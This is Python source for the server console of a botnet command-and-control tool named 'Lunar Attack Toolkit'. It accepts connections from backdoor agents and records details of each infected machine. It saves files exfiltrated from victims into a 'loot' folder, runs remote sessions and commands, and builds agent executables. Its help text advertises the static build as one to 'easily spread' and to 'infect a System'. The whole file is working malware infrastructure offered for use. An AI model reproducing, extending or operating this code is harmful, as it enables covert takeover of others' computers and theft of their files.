import socket
import _thread
from .infodb import *
from .session import run_session
import configparser
from os import stat
from os import path
from .builder import create_agent
import os
import subprocess
from .banner import p_banner
from .notif import notify
from colorama import Fore, Style
import colorama 
from .scanner import *
import tqdm

colorama.init()

clients = []
os_list = []

ip_list = []
wan_ip_list = []

blacklist = []

isSession = False

info_db = configparser.ConfigParser()
settings = configparser.ConfigParser()

try:
    settings.read("lunar.ini")
    server_settings = settings['server']
    bot_settings = settings['bot']
except Exception as e:
    print(str(e))
    exit(True)


def send_data(c_socket, data):
    c_socket = int(c_socket)
    sock_fd = clients[c_socket]
    
    try:
        sock_fd.send(data.encode())
    except Exception as error:
        clients.remove(sock_fd)
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(error))


def send_f_data(c_socket, data):
    c_socket = int(c_socket)
    sock_fd = clients[c_socket]
    
    try:
        sock_fd.send(data.encode())
    except Exception as error:
        clients.remove(sock_fd)
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(error))


def send_bytes(c_socket, data):
    """ Binary File Content is sent without Encryption """ 
    c_socket = int(c_socket)
    sock_fd = clients[c_socket]
    
    try:
        sock_fd.send(data)
    except Exception as error:
        clients.remove(sock_fd)
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(error))


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def bot_list():
    return str(len(clients))


def all_bot_names():
    if len(clients) > 0:
        for i in range(len(ip_list)):
            return bot_name_only(ip_list[i])
    else:
        return "-"


def broadcast(data):
    try:
        for i in clients:
            i.send(data.encode())
    except Exception as error:
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(error))


def receive_thread(ip, port, c_socket, wan_ip, operating_system):
    """
    This function runs in a Thread and receives data 
    from the client.
    """
    def clear_lists():
        try:
            clients.remove(c_socket)
            ip_list.remove(ip)
            wan_ip_list.remove(wan_ip)
            os_list.remove(operating_system)
        except ValueError:
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Socket not in list.")

    while True:
        try:
            
            def uniquify(file_path):
                """
                Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
                """
                filename, extension = os.path.splitext(file_path)
                counter = 1

                while os.path.exists(file_path):
                    file_path = filename + " (" + str(counter) + ")" + extension
                    counter += 1

                return file_path

            response = c_socket.recv(1024).decode()
            if not response:
                clear_lists()
                print("[!] BOT disconnected.")
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
                break
            
            if response.startswith("savethis"):
                print("\n[+] Incoming file..")
                f_path = "loot/"+bot_name_only(wan_ip).replace("/", "-")
                
                try:
                    os.mkdir(f_path)
                except FileExistsError:
                    pass
                except Exception as E:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(E))
                try:
                    f = response.split("=")
                    c_socket.settimeout(10)
                    try:

                        full_file = uniquify(f_path+"/"+f[1])
                        with open(full_file, "wb") as received_file:
                            data = c_socket.recv(4096)
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=f[1], fd=full_file))
                            while data:
                                received_file.write(data)
                                data = c_socket.recv(4096)
                                if not data:
                                    break
                                
                    except socket.timeout:
                        c_socket.settimeout(None)

                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded file '"+f[1] + "'.")
                        try:
                            sa = stat(full_file)
                            print(
                                "\nOriginal Filename : {filename}\nSize : {size} bytes\nSaved in : '{fp}'".format(
                                    filename=f[1],
                                    size=str(sa.st_size),
                                    fp=str(path.dirname(path.abspath(f_path+"/"+f[1])))
                                )
                            )
                        except FileNotFoundError:
                            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not Downloaded.")

                except IndexError:
                    print("Error.")
            else:
                print("\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] "+ip+":"+port+" -\n" + str(response))
        except UnicodeDecodeError as ude:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Decode error : " + str(ude))
        except UnicodeEncodeError as eEe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Encode error : " + str(eEe))
        except ConnectionAbortedError as cAe:
            clear_lists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cAe))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break

        except ConnectionRefusedError as cRe:
            # cRe : Connection Refused Error ;'v
            clear_lists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cRe))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break
        except ConnectionResetError as cRetwo:
            clear_lists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cRetwo))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break
        except ConnectionError as cE:
            # cE : Connection Error :'v
            clear_lists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cE))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break

        except socket.error as se:
            clear_lists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(se))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break
        
        except Exception as recv_error:
            clear_lists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(recv_error))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break
    

def main_server():
    """
    This is the main server where backdoors connect
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

    host = server_settings['host']
    port = int(server_settings['port'])

    b_list = open("blacklist", "r")
    bl_ips = b_list.readlines()
    for i in range(len(bl_ips)):
        if "#" in bl_ips[i]:
            pass
        else:
            blacklist.append(bl_ips[i])
    try:
        server.bind((host, port))
    except PermissionError:
        print("["+Style.BRIGHT + Fore.LIGHTYELLOW_EX + "^" + Style.RESET_ALL + "] Run as sudo.")
        exit(True)
    except Exception as i:
        raise i
    try:
        server.listen(5)
        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "]" + Fore.MAGENTA + " TCP Server running @ " + Fore.GREEN + "({host}:{port})".format(host=host, port=server_settings['port']))
    except KeyboardInterrupt:
        print(" Keyboard Interrupt, Exit.")
        exit()
    except Exception as err_unknown:
        print(str(err_unknown))
    while True:
        client, addr = server.accept()
        if addr[0] in blacklist:
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] New Connection form blacklisted IP " + str(addr[0]) + ":" + str(addr[1]))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Connection Closed.")
            client.shutdown(socket.SHUT_RDWR)
            client.close()
            break
        clients.append(client)
        ip_list.append(str(addr[0]))
        if bot_settings['verbose'] == "True":
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] New connection from " + str(addr[0]) + ":" + str(addr[1]))
        try:
            pw = bot_settings['password']
            if bot_settings['verbose'] == "True":
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Sending Password : "+pw + " ..")
            client.send(pw.encode())
            client.settimeout(10)
            try:
                # Set 10 seconds timeout to wait for client
                pw_info = client.recv(1024).decode()
                if pw_info.startswith("INCORRECT PASSWORD."):
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] " + pw_info + ". Password Rejected by Agent.")
                    clients.remove(client)
                    ip_list.remove(str(addr[0]))
                    break
            except socket.timeout:
                client.settimeout(None)
                print("\n[+] Timed out, Client did not send a Response.")
                print("\n[+] Forwarding to Scanner {ip}:{port}..".format(ip=str(addr[0]), port=str(addr[1])))
                scan_ip(addr[0])
                client.shutdown(socket.SHUT_RDWR)
                client.close()
                clients.remove(client)
                ip_list.remove(addr[0])
                break
            client.settimeout(None)
            if bot_settings['verbose'] == "True":
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] " + pw_info)
            # Receive Wan ip for file name
            client.send("wanip".encode())
            wan_ip = client.recv(1024).decode()
            client.send("os".encode())
            operating_system = client.recv(1024).decode()
            wan_ip_list.append(wan_ip)
            os_list.append(operating_system)
        except ConnectionResetError as cRe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ERROR : " + str(cRe) + ". Most likely password was rejected.")
            clients.remove(client)
            ip_list.remove(str(addr[0]))
            os_list.remove(operating_system)
        except ConnectionAbortedError as cAe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ERROR : " + str(cAe) + ". Most likely password was rejected.")
            clients.remove(client)
            ip_list.remove(str(addr[0]))
            os_list.remove(operating_system)
            
        if wan_ip.startswith("No"):
            filename = "bots/"+str(addr[0])
        else:
            filename = "bots/"+str(wan_ip)
        if bot_settings['verbose'] == "True":
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Getting information..") 
        save_info(client, filename)
        notify(str(addr[0]), str(addr[1]), str(len(clients)))
        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] " + str(addr[0])+":"+str(addr[1]) + " is " + Fore.GREEN + "online.")
        _thread.start_new_thread(receive_thread, (str(addr[0]), str(addr[1]), client, wan_ip, os,))


def console():

    def list_bots():
        print(Fore.WHITE + "\n[" + Fore.GREEN + "*" + Fore.WHITE + "]" + Fore.WHITE +" Current Connections (" + Fore.GREEN + str(len(clients)) + ")")
        print("==================================================================")
        try:
            if len(clients) > 0:
                for i in range(len(ip_list)):
                    print(Fore.GREEN + "\n[ SESSION ID : "+str(i) + " ]" + Fore.WHITE + "[ Connection : "+ip_list[i] + " ]" + Fore.YELLOW + "[ WAN : "+wan_ip_list[i] + " ]" + Fore.BLUE + "[ OPERATING SYSTEM : " + os_list[i] + " ]")
        except Exception as s_tre:
            print(Fore.RED + "[!]" + Fore.WHITE + "Error : " + str(s_tre))

    _thread.start_new_thread(main_server, ())
    
    while True:
        try:
            command = input(Fore.YELLOW + "#/master@Lunar:> " + Fore.WHITE)
            args = command.split()
            if command == "help":
                print(Fore.GREEN + Style.BRIGHT +  
                    """
                    HELP 
                    -------------
                    ~ Console Commands :
                    ---------------------------
                    + list/sessions - List online clients.

                    + settings - View settings.

                    + session - Interact with a Client.
                      - USAGE : session <session id>

                    + kill - Kill a connection.
                      - USAGE : kill <session id>
                    
                    + blacklist - Blacklist an IP address.
                        - USAGE : blacklist <ip>

                    + botinfo - View information of a Connection BOT/Client.

                    + banner - Print banner.

                    + build <lhost> <lport> <password> <mode (static / normal) >

                    + exit - Exit.

                    Lunar Attack Toolkit
                    Created by : Culpri4
                    """ + Style.RESET_ALL 
                )
            elif command.startswith("blacklist"):
                try:
                    b_args = command.split()
                    if len(b_args[1]) > 0:
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Blacklisting IP : {ip}.\n |_ View file 'blacklist' to allow.".format(ip=b_args[1]))
                        with open("blacklist", "a+") as black_list:
                            black_list.write("\n"+b_args[1])
                    else:
                        print("USAGE : blacklist < ip > ")
                except FileNotFoundError:
                    print("CRITICAL : Blacklist file not found. Contact Developer.")
                except IndexError:
                    print("USAGE : blacklist < ip > ")

            elif command == "settings":
                print(
                    "["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] TCP Server Host : " + server_settings['host'] + 
                    "\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] TCP Server Port : " + server_settings['port'] +
                    "\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Print BOT INFO on connect : " + bot_settings['auto_print_bot_info'] + 
                    "\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] BOT Password : " + bot_settings['password'] 
                 )
            elif command == "list" or command == "sessions":
                list_bots()
            elif command.startswith("session"):
                s = command.split()
                try:
                    sid = int(s[1])
                    prefix = bot_name_only(wan_ip_list[sid]).split("/")
                    prmpt = prefix[1].strip() + "("+Fore.RED + Style.BRIGHT + wan_ip_list[sid] + Style.RESET_ALL + ") > "
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Session opened for Client ID {id}.".format(id=str(sid)))
                    is_session = True
                    run_session(clients[sid], is_session, prmpt, sid, ip_list[sid])
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Session closed for Client ID {id}.".format(id=str(sid)))
                except IndexError:
                    try:
                        print("CID {s} not online.".format(s=s[1]))
                    except IndexError:
                        print("USAGE : session < session id> ")
                except Exception as es:
                    print("Error! ("+str(es)+")")

            elif command.startswith("kill"):
                try:
                    cid = int(args[1])
                    send_data(cid, "kill")
                    clients[cid].shutdown(socket.SHUT_RDWR)
                    clients[cid].close()
                    
                except IndexError:
                    print("USAGE : kill <session id>")
            elif command.startswith("build"):
                try:
                    lhost = args[1]
                    lport = args[2]
                    passwd = args[3]
                    mode = args[4]
                    create_agent(lhost, lport, passwd, mode)
                except IndexError:
                    print("""
                    [X] USAGE : build <lhost> <lport> <password> <static>/<normal>

                    LHOST - Ipv4 Address of Server to Connect to.
                    LPORT - Port of Server to Connect to.
                    static - Standalone Executable to run on almost any System.
                    normal - Executable that requires libraries to run.
                    password - Password set in clientc.h and lunar.ini

                    EXAMPLES : 
                    [+] build lhost=192.168.0.101 lport=443 static
                    |- Size : Around 2.1 MB.
                    |- This will generate an Executable that you can easily spread 
                        without worrying that it will work or not.

                    [+] build lhost=192.168.0.101 lport=443 normal
                    |- Size : Around 600 kb.
                    |- This will generate an Executable that you can use for tests
                        on your own PC. Or infect a System which an environment where
                        it can run.
                        """)
            elif command.startswith("botinfo"):
                try:
                    info_for = ip_list[int(args[1])]
                    read_info(info_for)
                except IndexError:  
                    print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] USAGE : botinfo < cid > / botinfo -offline")
                except ValueError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Loading offline bots..")
                    fl = os.listdir("bots")
                    fl.remove("readme.md")
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Offline Bots")
                    try:
                        for x in range(len(fl)):
                            print("""
                        [{index}] - [ {wanip} ] [ {os} ] [ {hname} ]
                            """.format(
                                index=str(x), 
                                wanip=fl[x].replace(".ini", ""), 
                                os=bot_os_only("bots/"+fl[x].replace(".ini", "")),
                                hname=bot_name_only("bots/"+fl[x].replace(".ini", ""))
                                ))
                            
                        ask = input("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Enter Index : ")
                        if len(ask) > 0:
                            fsp = fl[int(ask)] 
                            read_info("bots/"+fsp.replace(".ini", ""))
                    except Exception as UnknownException:
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(UnknownException))     

            elif command == "banner":
                print(p_banner())
            
            elif command.startswith("send"):
                try:
                    cid = args[1]
                    send_data(cid, args[2])
                except IndexError:
                    print("USAGE : send <id> <data>")

            elif command == "exit":
                if len(clients) > 0:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] You have concurrent bots. Kill the connections?")
                    yn = input("(y/n?): ").lower()
                    if yn == "y":
                        broadcast("kill")
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Disconnected everyone.")
                        exit(True)
                    else:
                        pass
                else:
                    exit(True)
                
            else:
                if len(command) > 0:
                    try:
                        print(Style.BRIGHT + Fore.LIGHTCYAN_EX)
                        subprocess.run(['bash', '-c', command])
                        print(Style.RESET_ALL)
                    except Exception as procError:
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(procError))

        except KeyboardInterrupt:
            print(" = Interrupt. Type Exit to exit.")
